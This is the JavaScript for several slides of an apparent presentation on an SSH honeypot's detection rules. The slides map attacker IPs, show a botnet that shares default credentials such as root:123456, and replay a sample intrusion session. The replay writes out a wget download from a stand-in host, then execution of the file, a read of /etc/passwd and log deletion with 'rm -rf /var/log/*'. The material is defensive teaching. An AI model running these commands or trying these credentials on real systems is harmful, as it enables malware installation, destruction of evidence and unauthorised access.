/* Slides 11-16: who (map), techniques (rules), botnet, after (replay), demo, closing */
(function () {
  'use strict';
  const SEV_ORDER = { none: 0, low: 1, medium: 2, high: 3, critical: 4 };
  const SEV_COL = { none: '#7d8782', low: '#9aa59f', medium: '#e0b040', high: '#ff7b3a', critical: '#ff4d4d' };
  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const icon = (id, cls) => '<svg class="ic ' + (cls || '') + '"><use href="#' + id + '"/></svg>';

  /* ========================================================================= 11  WHO */
  (function () {
    const PTS = [
      { ip: '203.0.113.10', c: 'China', city: 'Beijing', lat: 39.90, lon: 116.40, ev: 60, f: 36, sev: 'high' },
      { ip: '198.51.100.7', c: 'Brazil', city: 'Sao Paulo', lat: -23.55, lon: -46.63, ev: 32, f: 16, sev: 'medium' },
      { ip: '203.0.113.25', c: 'Russia', city: 'Moscow', lat: 55.75, lon: 37.62, ev: 12, f: 8, sev: 'high' },
      { ip: '192.0.2.88', c: 'South Korea', city: 'Seoul', lat: 37.57, lon: 126.98, ev: 22, f: 6, sev: 'critical' },
      { ip: '192.0.2.99', c: 'United States', city: 'Ashburn', lat: 39.04, lon: -77.49, ev: 56, f: 0, sev: 'medium' },
      { ip: '198.51.100.44', c: 'India', city: 'Mumbai', lat: 19.08, lon: 72.88, ev: 6, f: 4, sev: 'high' },
      { ip: '198.51.100.45', c: 'Nigeria', city: 'Lagos', lat: 6.52, lon: 3.38, ev: 6, f: 4, sev: 'none' },
      { ip: '198.51.100.46', c: 'Vietnam', city: 'Hanoi', lat: 21.03, lon: 105.85, ev: 6, f: 4, sev: 'none' },
      { ip: '198.51.100.47', c: 'Netherlands', city: 'Amsterdam', lat: 52.37, lon: 4.90, ev: 6, f: 4, sev: 'none' },
      { ip: '192.0.2.77', c: 'Indonesia', city: 'Jakarta', lat: -6.21, lon: 106.85, ev: 10, f: 2, sev: 'critical' },
      { ip: '192.0.2.150', c: 'Canada', city: 'Toronto', lat: 43.65, lon: -79.38, ev: 6, f: 2, sev: 'none' },
      { ip: '192.0.2.151', c: 'Germany', city: 'Berlin', lat: 52.52, lon: 13.40, ev: 3, f: 1, sev: 'none' },
      { ip: '192.0.2.152', c: 'Australia', city: 'Sydney', lat: -33.87, lon: 151.21, ev: 3, f: 1, sev: 'none' },
      { ip: '192.0.2.153', c: 'South Africa', city: 'Johannesburg', lat: -26.20, lon: 28.05, ev: 6, f: 2, sev: 'none' },
      { ip: '192.0.2.154', c: 'Turkey', city: 'Istanbul', lat: 41.01, lon: 28.98, ev: 6, f: 2, sev: 'none' },
    ];
    const ROWS = [PTS[0], { ip: '192.168.56.20', c: 'Private network', city: '', f: 32, ev: 61, sev: 'critical', lan: true }, PTS[1], PTS[2], PTS[3], PTS[4]];
    const cv = $('#map'), ctx = cv.getContext('2d'), tip = $('#map-tip'), table = $('#q1-table');
    const W = cv.width, H = cv.height, M = window.WORLD_MAP;
    const maxEv = Math.max.apply(null, PTS.map((p) => p.ev));
    const land = new Path2D(M.path);
    let stop = null, hover = null, sel = null;
    const xy = (p) => [((p.lon + 180) / M.width) * W, ((M.top - p.lat) / M.height) * H];
    const rad = (p) => 7 + 24 * Math.sqrt(p.ev / maxEv);

    function draw(t) {
      ctx.clearRect(0, 0, W, H);
      ctx.strokeStyle = '#1a201d'; ctx.lineWidth = 1;
      for (let lon = -150; lon <= 150; lon += 30) { const x = ((lon + 180) / M.width) * W; ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, H); ctx.stroke(); }
      for (let lat = -30; lat <= 60; lat += 30) { const y = ((M.top - lat) / M.height) * H; ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke(); }
      ctx.save(); ctx.scale(W / M.width, H / M.height);
      ctx.fillStyle = '#1c2520'; ctx.strokeStyle = '#33443a'; ctx.lineWidth = 0.3;
      [-360, 0, 360].forEach((dx) => { ctx.save(); ctx.translate(dx, 0); ctx.fill(land); ctx.stroke(land); ctx.restore(); });
      ctx.restore();
      PTS.forEach((p, i) => {
        const [x, y] = xy(p), r = rad(p), active = (sel === p.ip || hover === p.ip);
        const ph = ((t / 2200) + i * 0.137) % 1;
        ctx.beginPath(); ctx.arc(x, y, r + ph * 26, 0, Math.PI * 2);
        ctx.strokeStyle = 'rgba(57,255,20,' + (0.5 * (1 - ph)).toFixed(3) + ')'; ctx.lineWidth = 2; ctx.stroke();
        ctx.beginPath(); ctx.arc(x, y, r, 0, Math.PI * 2);
        ctx.fillStyle = active ? 'rgba(255,255,255,.28)' : 'rgba(57,255,20,.22)'; ctx.fill();
        ctx.lineWidth = active ? 3.5 : 2.2; ctx.strokeStyle = active ? '#ffffff' : '#39ff14'; ctx.stroke();
      });
      const lab = PTS.find((p) => p.ip === (hover || sel));
      if (lab) {
        const [x, y] = xy(lab);
        ctx.font = 'bold 24px "DejaVu Sans Mono", Consolas, monospace';
        const text = lab.c + ' · ' + lab.f + ' failed';
        const tw = ctx.measureText(text).width + 22;
        const bx = Math.max(6, Math.min(W - tw - 6, x - tw / 2)), by = y - rad(lab) - 44 < 6 ? y + rad(lab) + 10 : y - rad(lab) - 44;
        ctx.fillStyle = 'rgba(11,13,12,.92)'; ctx.strokeStyle = '#39ff14'; ctx.lineWidth = 1.5;
        ctx.fillRect(bx, by, tw, 34); ctx.strokeRect(bx, by, tw, 34);
        ctx.fillStyle = '#fff'; ctx.fillText(text, bx + 11, by + 25);
      }
    }
    function pick(e) {
      const r = cv.getBoundingClientRect(), k = cv.width / r.width;
      const mx = (e.clientX - r.left) * k, my = (e.clientY - r.top) * k;
      let best = null, bd = 1e9;
      PTS.forEach((p) => { const [x, y] = xy(p), d = Math.hypot(x - mx, y - my); if (d <= rad(p) + 8 && d < bd) { best = p; bd = d; } });
      return best;
    }
    cv.addEventListener('mousemove', (e) => { const p = pick(e); hover = p ? p.ip : null; cv.style.cursor = p ? 'pointer' : 'default'; });
    cv.addEventListener('mouseleave', () => { hover = null; });
    cv.addEventListener('click', (e) => { const p = pick(e); sel = p ? (sel === p.ip ? null : p.ip) : null; markRows(); });

    function markRows() { $$('#q1-table tr[data-ip]').forEach((tr) => tr.classList.toggle('sel', tr.dataset.ip === sel)); }
    table.innerHTML = '<thead><tr><th>Source IP</th><th>Country</th><th>Failed</th><th>Alert</th></tr></thead><tbody>' +
      ROWS.map((r) => '<tr data-ip="' + r.ip + '"' + (r.lan ? ' class="lanrow"' : '') + '><td>' + r.ip + '</td><td>' + esc(r.c) + '</td><td>' + r.f + '</td><td><span class="badge sev-' + r.sev + '">' + r.sev + '</span></td></tr>').join('') + '</tbody>';
    $$('#q1-table tr[data-ip]').forEach((tr) => tr.addEventListener('click', () => {
      const ip = tr.dataset.ip; sel = sel === ip ? null : ip; markRows();
    }));

    Deck.register('q1', {
      enter() { sel = null; hover = null; markRows(); stop = Deck.loop(draw); },
      leave() { if (stop) stop(); stop = null; },
    });
  })();

  /* ====================================================================== 12  TECHNIQUES */
  (function () {
    const T = Deck.timers();
    const RULES = [
      { n: 'brute_force', s: 'medium', i: 'i-hammer', d: 'Too many failed logins in a short time.', t: '5 failed logins in 60 s' },
      { n: 'rapid_attack', s: 'high', i: 'i-clock', d: 'A much faster burst: almost certainly a script.', t: '10 failed logins in 30 s' },
      { n: 'username_enumeration', s: 'medium', i: 'i-search', d: 'Many different usernames from one IP: they are mapping the accounts.', t: '5 usernames in 60 s' },
      { n: 'password_spraying', s: 'high', i: 'i-spray', d: 'One password tried on many accounts, quietly.', t: 'same password on 3+ usernames in 5 min' },
      { n: 'dictionary_attack', s: 'medium', i: 'i-book', d: 'Many different well-known passwords in a row. We compare password fingerprints, never real passwords.', t: '5 common passwords in 5 min', nw: 1 },
      { n: 'repeated_attacks', s: 'medium', i: 'i-eye', d: 'The same source comes back hour after hour: a persistent attacker.', t: 'failures in 3+ separate hours' },
      { n: 'success_after_failures', s: 'critical', i: 'i-key', d: 'A login succeeded after many failures: they guessed it.', t: '5+ failures in the 10 min before' },
      { n: 'suspicious_commands', s: 'high', i: 'i-terminal', d: 'Commands typed in the fake shell look like an attacker’s playbook: recon, download, persistence, destruction, evasion, crypto-mining.', t: 'pattern match on every command' },
      { n: 'download_and_execute', s: 'critical', i: 'i-skull', d: 'In one session a file is downloaded, then run: a malware installation attempt.', t: 'download → execute, same session', nw: 1 },
      { n: 'connection_flood', s: 'medium', i: 'i-session', d: 'Lots of connections, almost no logins: a scanner or a flood.', t: '20 connections in 60 s', nw: 1 },
      { n: 'distributed_attack', s: 'high', i: 'i-network', d: 'Several IPs share the same credentials in the same period: a botnet. See the next slide.', t: '3+ IPs, 3+ shared credentials, 10 min', nw: 1 },
    ];
    const grid = $('#rules'), det = $('#rdetail');
    grid.innerHTML = RULES.map((r, k) => '<button class="rule' + (r.nw ? ' isnew' : '') + '" data-k="' + k + '">' + icon(r.i) + '<b>' + r.n + '</b><span class="badge sev-' + r.s + '">' + r.s + '</span>' + (r.nw ? '<i class="new">NEW</i>' : '') + '</button>').join('') +
      '<div class="rule legend"><i class="new">NEW</i><span>added by our team</span></div>';
    function show(k) {
      const r = RULES[k];
      $$('#rules .rule[data-k]').forEach((b) => b.classList.toggle('sel', +b.dataset.k === k));
      det.innerHTML = '<div class="rd-top">' + icon(r.i) + '<b>' + r.n + '</b><span class="badge sev-' + r.s + '">' + r.s + '</span>' + (r.nw ? '<i class="new">NEW</i>' : '') + '</div><p>' + esc(r.d) + '</p><code>' + esc(r.t) + '</code>';
    }
    $$('#rules .rule[data-k]').forEach((b) => b.addEventListener('click', () => show(+b.dataset.k)));

    /* playground */
    const range = $('#pg-range'), num = $('#pg-n'), bf = $('#lamp-bf'), ra = $('#lamp-ra'), sim = $('#pg-sim');
    function upd() {
      const v = +range.value; num.textContent = v;
      bf.classList.toggle('on', v >= 5); ra.classList.toggle('on', v >= 10);
      num.className = v >= 10 ? 'hi' : v >= 5 ? 'med' : '';
    }
    range.addEventListener('input', upd);
    range.addEventListener('pointerup', () => range.blur());
    sim.addEventListener('click', () => {
      T.clear(); range.value = 0; upd();
      T.every(() => { if (+range.value >= 14) { T.clear(); return; } range.value = +range.value + 1; upd(); }, 360);
    });
    Deck.register('q2', {
      enter() { T.clear(); range.value = 0; upd(); det.innerHTML = '<span class="rd-hint">Click a rule to read what it does</span>'; $$('#rules .rule').forEach((b) => b.classList.remove('sel')); },
      leave() { T.clear(); },
    });
  })();

  /* ====================================================================== 13  BOTNET */
  (function () {
    const BOTS = [['198.51.100.44', 'India · Mumbai'], ['198.51.100.45', 'Nigeria · Lagos'], ['198.51.100.46', 'Vietnam · Hanoi'], ['198.51.100.47', 'Netherlands · Amsterdam']];
    const CRED = ['root:123456', 'admin:admin', 'pi:raspberry', 'ubnt:ubnt'];
    const cards = $('#bn-cards'), lines = $('#bn-lines'), root = $('#botnet .bn');
    cards.innerHTML = BOTS.map((b) => '<div class="bn-card"><div class="bn-ip">' + b[0] + '</div><div class="bn-geo">' + b[1] + '</div>' +
      '<div class="bn-gauge"><i style="width:80%"></i><u></u></div><div class="bn-gl"><span>4 failed logins</span><span>limit 5</span></div>' +
      '<div class="bn-creds">' + CRED.map((c) => '<code>' + c + '</code>').join('') + '</div>' +
      '<div class="bn-st quiet">no alert</div><div class="bn-st shared">same credentials as the others</div></div>').join('');
    let paths = '';
    [140, 441, 742, 1043].forEach((x) => { paths += '<path d="M' + x + ' 0 C ' + x + ' 55, 592 40, 592 118" class="bn-ln"/>'; });
    lines.innerHTML = paths;
    function view(v) {
      root.dataset.view = v;
      $('#bn-a').classList.toggle('on', v === 'a'); $('#bn-b').classList.toggle('on', v === 'b');
    }
    $('#bn-a').addEventListener('click', () => view('a'));
    $('#bn-b').addEventListener('click', () => view('b'));
    Deck.register('botnet', { enter() { view('a'); }, step(n) { view(n >= 1 ? 'b' : 'a'); } });
  })();

  /* ====================================================================== 14  AFTER (replay) */
  (function () {
    const T = Deck.timers();
    const body = $('#rp-body'), range = $('#rp-range'), alertsBox = $('#rp-alerts'), bar = $$('#th-bar i'), lbl = $('#th-lbl');
    const EV = [
      { login: 'root / P*********', alert: { n: 'success_after_failures', s: 'critical', d: 'after 6 failed attempts' } },
      { cmd: 'uname -a', cat: 'reconnaissance', s: 'low', out: 'Linux svr04 5.15.0-91-generic x86_64' },
      { cmd: 'whoami', cat: 'reconnaissance', s: 'low', out: 'root' },
      { cmd: 'cat /etc/passwd', cat: 'credential access', s: 'medium', out: 'root:x:0:0:root:/root:/bin/bash …' },
      { cmd: 'cd /tmp' },
      { cmd: 'wget http://198.51.100.250/bins/x86_64', cat: 'download', s: 'high', out: "'x86_64' saved" },
      { cmd: 'chmod 777 x86_64', cat: 'execution', s: 'high', alert: { n: 'download_and_execute', s: 'critical', d: 'file downloaded, then run' } },
      { cmd: './x86_64', cat: 'execution', s: 'high' },
      { cmd: 'rm -rf /var/log/*', cat: 'destruction · evasion', s: 'high' },
      { cmd: 'history -c', cat: 'defense evasion', s: 'high' },
    ];
    let token = 0, shown = 0;
    const sleep = (ms) => new Promise((r) => T.after(r, ms));

    function lineEl(ev, full) {
      const d = document.createElement('div'); d.className = 'rl';
      if (ev.login) d.innerHTML = '<span class="m">login attempt [' + esc(ev.login) + '] </span><span class="okk">succeeded</span>';
      else d.innerHTML = '<span class="p">root@svr04:~#</span> <span class="cm">' + (full ? esc(ev.cmd) : '') + '</span>' + (full && ev.cat ? tag(ev) : '');
      return d;
    }
    const tag = (ev) => '<span class="tg sev-' + ev.s + '">' + esc(ev.cat) + '</span>';

    function flags(k) {
      const out = []; let sus = null;
      for (let i = 0; i < k; i++) {
        const e = EV[i];
        if (e.alert) out.push(e.alert);
        if (e.s) {
          if (!sus) { sus = { n: 'suspicious_commands', s: e.s, d: 'commands in the session look hostile' }; out.push(sus); }
          else if (SEV_ORDER[e.s] > SEV_ORDER[sus.s]) sus.s = e.s;
        }
      }
      return out;
    }
    function status(k) {
      const f = flags(k);
      alertsBox.innerHTML = f.length ? f.map((a) => '<div class="al sev-' + a.s + '"><b>' + a.n + '</b><span class="badge sev-' + a.s + '">' + a.s + '</span><small>' + esc(a.d) + '</small></div>').join('') : '<div class="al-empty">nothing flagged yet</div>';
      let lvl = 0; f.forEach((a) => { lvl = Math.max(lvl, SEV_ORDER[a.s]); });
      bar.forEach((b, i) => { b.className = i < lvl ? 'on l' + lvl : ''; });
      lbl.textContent = ['quiet', 'low', 'medium', 'high', 'critical'][lvl];
      lbl.className = 'th-lbl l' + lvl;
      range.value = k; shown = k;
    }
    function renderTo(k) {
      body.innerHTML = '';
      if (k === 0) { const d = document.createElement('div'); d.className = 'rl m'; d.textContent = 'Press → (or Replay) to watch what the attacker does…'; body.appendChild(d); }
      for (let i = 0; i < k; i++) {
        body.appendChild(lineEl(EV[i], true));
        if (EV[i].out) { const o = document.createElement('div'); o.className = 'rl out'; o.textContent = EV[i].out; body.appendChild(o); }
      }
      while (body.children.length > 12) body.removeChild(body.firstChild);
      status(k);
    }
    async function play(from) {
      const tk = ++token; T.clear();
      renderTo(from);
      for (let i = from; i < EV.length; i++) {
        const ev = EV[i];
        const el = lineEl(ev, false); body.appendChild(el);
        while (body.children.length > 12) body.removeChild(body.firstChild);
        if (ev.cmd) {
          const cm = el.querySelector('.cm');
          for (let c = 1; c <= ev.cmd.length; c++) { if (tk !== token) return; cm.textContent = ev.cmd.slice(0, c); await sleep(22); }
        }
        if (tk !== token) return;
        el.replaceWith(lineEl(ev, true));
        if (ev.out) { const o = document.createElement('div'); o.className = 'rl out'; o.textContent = ev.out; body.appendChild(o); }
        status(i + 1);
        await sleep(ev.cmd === 'cd /tmp' ? 450 : 780);
      }
    }
    $('#rp-play').addEventListener('click', () => play(0));
    range.addEventListener('input', () => { token += 1; T.clear(); renderTo(+range.value); });
    range.addEventListener('pointerup', () => range.blur());
    Deck.register('q3', {
      enter() { token += 1; renderTo(0); },
      leave() { token += 1; T.clear(); },
      step(n, jump) { if (n >= 1) { if (jump) { token += 1; T.clear(); renderTo(EV.length); } else play(0); } else { token += 1; T.clear(); renderTo(0); } },
    });
  })();

  /* ====================================================================== 16  CLOSING */
  (function () {
    const ACTS = [
      ['i-firewall', 'Review firewall rules'],
      ['i-shield', 'Strengthen SSH authentication'],
      ['i-lock', 'Disable password authentication where appropriate'],
      ['i-key', 'Enforce key-based authentication and MFA'],
      ['i-server', 'Check whether similar activity reached real servers'],
      ['i-sliders', 'Update monitoring and detection rules'],
    ];
    const box = $('#acts'), fg = $('#rg-fg'), num = $('#rg-n');
    const C = 2 * Math.PI * 52;
    fg.style.strokeDasharray = C; fg.style.strokeDashoffset = C;
    box.innerHTML = ACTS.map((a, i) => '<button class="act" data-i="' + i + '">' + icon(a[0], 'big') + '<span>' + a[1] + '</span><i class="chk">' + icon('i-check') + '</i></button>').join('');
    const acts = $$('#acts .act');
    function ring() {
      const done = acts.filter((a) => a.classList.contains('done')).length;
      num.textContent = done; fg.style.strokeDashoffset = C * (1 - done / ACTS.length);
      $('#close').classList.toggle('all', done === ACTS.length);
    }
    acts.forEach((a) => a.addEventListener('click', () => { a.classList.toggle('done'); ring(); }));
    Deck.register('close', {
      enter() { acts.forEach((a) => a.classList.remove('done')); ring(); },
      step(n) { acts.forEach((a, i) => a.classList.toggle('done', i < Math.min(n, ACTS.length))); ring(); },
    });
  })();
})();
